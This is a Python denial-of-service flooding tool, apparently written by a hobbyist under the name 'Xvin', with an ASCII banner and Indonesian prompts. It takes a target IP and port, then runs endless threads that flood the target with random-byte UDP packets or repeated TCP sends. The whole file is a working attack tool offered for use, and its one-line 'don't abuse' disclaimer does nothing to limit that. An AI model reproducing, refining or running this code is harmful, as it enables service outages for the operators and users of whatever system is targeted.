#!/usr/bin/env python3
#Ddos by Xvin
import random
import socket
import threading
import os

os.system("clear")
print("\033[93m")

print('''\033[94m Tools By XVin
__  ____     ___       
 \ \/ /\ \   / (_)_ __  
  \  /  \ \ / /| | '_ \ 
  /  \   \ V / | | | | |
 /_/\_\   \_/  |_|_| |_|
                        

------------------------------------------------------------
      >Jangan Abuse Tot<           
          >Abuse = ewe<              
-----------------------------------------------------------
''')
ip = str(input("MASUKIN IP NYA | ip:"))
port = int(input("MASUKIN PORT NYA | port:"))
choice = str(input("Gas?(y/n):"))
times = int(input("Packet Berapa? | Packets:"))
threads = int(input("Mau Berapa Lama? | Threads:"))
def run():
        data = random._urandom(1961)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print("\033[92m Punten Goput, atas nama XVin ya? ")
                except:
                        print("\033[94m Punten Goput, Yaaa gada orang ")
def run2():
        data = random._urandom(1961)
        i = random.choice(("[*]","[!]","[#]"))
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                             s.send(data)
                        print("\033[95m Punten Goput, atas nama XVin ya?")
                except:
                        s.close()
                        print("\033[93m Punten Goput, Yaaa gada orang")
for y in range(threads):
        if choice == 'y':
                th = threading.Thread(target = run)
                th.start()
        else:
                 th = threading.Thread(target = run2)
                 th.start()
